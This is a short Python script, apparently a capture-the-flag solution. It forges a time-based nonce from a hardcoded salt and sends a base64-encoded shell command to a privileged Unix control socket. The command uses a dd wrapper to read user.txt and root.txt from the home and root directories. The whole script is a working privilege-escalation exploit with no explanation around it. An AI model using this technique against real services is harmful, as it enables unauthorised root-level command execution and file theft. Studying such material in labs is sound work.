import socket,json,hashlib,time,base64
salt='sentinel-salt-v1-a3b7c2d9'
nonce=hashlib.sha256(f'{int(time.time())//60}:{salt}'.encode()).hexdigest()[:16]
payload='/opt/sentinel/tools/dd-wrapper /home/sentinel/user.txt; /opt/sentinel/tools/dd-wrapper /root/root.txt'
req={'op':'shell','nonce':nonce,'payload':base64.b64encode(payload.encode()).decode()}
s=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM);s.connect('/run/sentinel/ctrl.sock');s.sendall(json.dumps(req).encode()+b'\n')
b=b''
while True:
 x=s.recv(65535)
 if not x:break
 b+=x
print(b.decode())
